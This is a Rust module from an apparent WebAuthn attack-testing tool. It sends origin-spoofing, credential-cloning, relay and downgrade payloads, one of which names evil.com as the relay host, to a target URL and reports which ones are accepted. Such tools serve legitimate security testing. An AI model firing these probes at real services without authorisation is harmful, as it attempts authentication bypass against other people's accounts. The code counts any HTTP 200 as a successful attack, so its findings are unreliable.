use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder().timeout(Duration::from_secs(timeout)).redirect(reqwest::redirect::Policy::none()).build().unwrap_or_else(|_| Client::new())
}

pub async fn origin(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} WebAuthn Origin Confusion Test", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let origins = [
        ("Legitimate origin", "https://target.com"),
        ("Subdomain bypass", "https://evil.target.com"),
        ("Wildcard subdomain", "https://anything.target.com"),
        ("HTTP downgrade", "http://target.com"),
        ("Port variation", "https://target.com:8443"),
        ("Path append", "https://target.com.evil.com"),
        ("Different TLD", "https://target.evil.com"),
        ("Null origin", "null"),
        ("IP address", "https://127.0.0.1"),
        ("Data URI", "data:text/html,<script>fetch('https://target.com')</script>"),
    ];

    let mut results = Vec::new();

    for (name, origin) in &origins {
        let body = serde_json::json!({"origin": origin, "action": "webauthn_authenticate"}).to_string();
        match client.post(url).header("Content-Type", "application/json").body(body).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let resp_body = resp.text().await.unwrap_or_default();
                let accepted = resp_body.contains("success") || resp_body.contains("verified") || resp_body.contains("authenticated") || status == 200;
                let tag = if accepted { "ACCEPTED".red().bold().to_string() } else { "rejected".green().to_string() };
                println!("  {} {:25} status={} {}", "*".cyan(), name, status, tag);
                if accepted { results.push(name.to_string()); }
            }
            Err(_) => { println!("  {} {:25} error", "*".red(), name); }
        }
    }

    if results.is_empty() {
        println!("\n{} All origin checks rejected — origin validation is strict.", "[-]".green().bold());
    } else {
        println!("\n{} {} origin(s) accepted — origin confusion possible!", "[!]".red().bold(), results.len());
    }
    Ok(())
}

pub async fn resident(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} WebAuthn Resident Key Abuse", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let tests = [
        ("Request resident key", r#"{"authenticatorSelection":{"requireResidentKey":true,"userVerification":"required"}}"#),
        ("Cross-device cred", r#"{"deviceId":"other_device","credentialId":"stolen_credential_id","action":"authenticate"}"#),
        ("Credential cloning", r#"{"credentialId":"target_cred_id","publicKey":"attacker_pubkey","action":"register_clone"}"#),
        ("Resident key dump", r#"{"action":"enumerate_resident_keys"}"#),
    ];

    let mut results = Vec::new();
    for (name, payload) in &tests {
        match client.post(url).header("Content-Type", "application/json").body(payload.to_string()).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let success = body.contains("success") || body.contains("keys") || body.contains("credential") || status == 200;
                let tag = if success { "SUCCESS".red().bold().to_string() } else { "rejected".green().to_string() };
                println!("  {} {:25} status={} {}", "*".cyan(), name, status, tag);
                if success { println!("    {} Response: {}", ">".red().bold(), body.chars().take(300).collect::<String>()); results.push(name.to_string()); }
            }
            Err(_) => { println!("  {} {:25} error", "*".red(), name); }
        }
    }

    println!("\n{} {} / {} resident key tests succeeded", "[*]".cyan().bold(), results.len(), tests.len());
    Ok(())
}

pub async fn relay(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} WebAuthn Relay Attack Simulation", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let relay_payloads = [
        ("MITM relay", r#"{"challenge":"relay_challenge","origin":"https://target.com","forward_to":"https://evil.com/relay","action":"begin_auth"}"#),
        ("Challenge forwarding", r#"{"challenge":"stolen_challenge","authenticatorData":"stolen_auth_data","signature":"stolen_sig","action":"complete_auth"}"#),
        ("Cross-origin relay", r#"{"real_origin":"https://target.com","attacker_origin":"https://evil.com","relay_challenge":true}"#),
        ("QR code relay", r#"{"action":"hybrid_relay","qr_data":"relay_qr_payload","device":"attacker_phone"}"#),
    ];

    let mut results = Vec::new();
    for (name, payload) in &relay_payloads {
        match client.post(url).header("Content-Type", "application/json").body(payload.to_string()).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let success = body.contains("challenge") || body.contains("success") || status == 200;
                let tag = if success { "RELAY OK".red().bold().to_string() } else { "blocked".green().to_string() };
                println!("  {} {:25} status={} {}", "*".cyan(), name, status, tag);
                if success { results.push(name.to_string()); }
            }
            Err(_) => { println!("  {} {:25} error", "*".red(), name); }
        }
    }

    println!("\n{} {} / {} relay attempts succeeded", "[*]".cyan().bold(), results.len(), relay_payloads.len());
    if !results.is_empty() { println!("{} Relay attack may be feasible — check origin binding.", "[!]".red().bold()); }
    Ok(())
}

pub async fn downgrade(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} WebAuthn Protocol Downgrade", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let downgrades = [
        ("U2F fallback", r#"{"protocol":"u2f","action":"authenticate","keyHandle":"target_key"}"#),
        ("No UV", r#"{"userVerification":"discouraged","action":"authenticate"}"#),
        ("No attestation", r#"{"attestation":"none","action":"register"}"#),
        ("Weak RP ID", r#"{"rpId":"com","action":"authenticate"}"#),
        ("None transport", r#"{"transports":["none"],"action":"authenticate"}"#),
        ("No backup", r#"{"backupEligible":false,"backupState":false,"action":"register"}"#),
    ];

    let mut results = Vec::new();
    for (name, payload) in &downgrades {
        match client.post(url).header("Content-Type", "application/json").body(payload.to_string()).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let accepted = body.contains("success") || body.contains("registered") || body.contains("authenticated") || status == 200;
                let tag = if accepted { "DOWNGRADED".red().bold().to_string() } else { "enforced".green().to_string() };
                println!("  {} {:25} status={} {}", "*".cyan(), name, status, tag);
                if accepted { results.push(name.to_string()); }
            }
            Err(_) => { println!("  {} {:25} error", "*".red(), name); }
        }
    }

    if results.is_empty() {
        println!("\n{} All downgrade attempts rejected — security is enforced.", "[-]".green().bold());
    } else {
        println!("\n{} {} downgrade(s) accepted — weak security allowed!", "[!]".red().bold(), results.len());
    }
    Ok(())
}
